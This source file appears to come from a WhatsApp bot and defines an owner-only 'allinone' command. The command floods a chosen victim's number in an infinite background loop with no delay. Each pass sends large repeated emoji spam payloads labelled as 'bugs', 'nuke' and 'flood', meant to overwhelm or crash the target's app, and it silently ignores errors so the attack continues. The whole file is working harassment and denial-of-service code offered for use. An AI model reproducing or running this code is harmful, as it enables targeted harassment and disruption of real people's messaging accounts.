import { owners } from '../config.js'

export const name = 'allinone'
export const description = 'Unleashes all known bugs simultaneously with maximum power and no cooldown'
export const command = ['allinone']
export const ownerOnly = true

// Precomputed payloads optimized for WhatsApp's 4096-character limit
const MAX_LINES = 170 // Max lines that fit in 4096 chars (24 char/line)
const PAYLOADS = {
  kill: Array(MAX_LINES).fill('💀 KILL BUG ACTIVATED 💀').join('\n'),
  bugx: Array(MAX_LINES).fill('🐛 BUGX SWARM INCOMING 🐛').join('\n'),
  potion: Array(MAX_LINES).fill('🧪 EVIL POTION BOMB 💣').join('\n'),
  witchcraft: Array(MAX_LINES).fill('🔮 WITCHCRAFT HEX ACTIVE ☠️').join('\n'),
  scambomb: Array(MAX_LINES).fill('🛑 SCAMBOMB DETONATED 💥').join('\n'),
  alpha: Array(MAX_LINES).fill('⚡ ALPHA BUG STRIKE 🌩️').join('\n'),
  ice: Array(MAX_LINES).fill('🧊 ERROR: SYSTEM FREEZE ❄️').join('\n'),
  nuke: Array(MAX_LINES).fill('☢️ NUCLEAR BUG DEPLOYED ⚛️').join('\n'),
  flood: Array(MAX_LINES).fill('🌊 MEGA FLOOD BUG ACTIVATED 💦').join('\n')
}

// New: Combined super payload
const SUPER_PAYLOAD = Object.values(PAYLOADS).join('\n\n')

export async function execute(m, { client, text, isOwner }) {
  if (!isOwner) return client.reply(m.chat, '🚫 Only the supreme witcher can unleash this bug!', m)

  let target = ''
  if (m.quoted) target = m.quoted.sender
  else if (text) target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  if (!target) return client.reply(m.chat, '⚠️ Specify a victim!', m)

  await client.reply(m.chat, `☠️ DEPLOYING ULTRA-BUG ON ${target}...`, m)

  // Fire-and-forget infinite attack
  const ATTACK = async () => {
    while (true) {
      try {
        // Combined super-spam
        await client.sendMessage(target, { text: SUPER_PAYLOAD })
        
        // Simultaneous individual attacks
        const attackPromises = Object.values(PAYLOADS).map(payload => 
          client.sendMessage(target, { text: payload })
        )
        
        // Enhanced payload variations
        await Promise.all([
          ...attackPromises,
          client.sendMessage(target, { text: PAYLOADS.nuke }),
          client.sendMessage(target, { text: PAYLOADS.flood.repeat(3) }),
          client.sendMessage(target, { 
            text: Array(500).fill('💥').join('') + ' CHAIN REACTION BUG ' + Array(500).fill('💢').join('')
          })
        ])
      } catch (e) {
        // Fail silently and continue attack
      }
    }
  }

  // Launch attack in background without blocking
  ATTACK().catch(() => {})
}
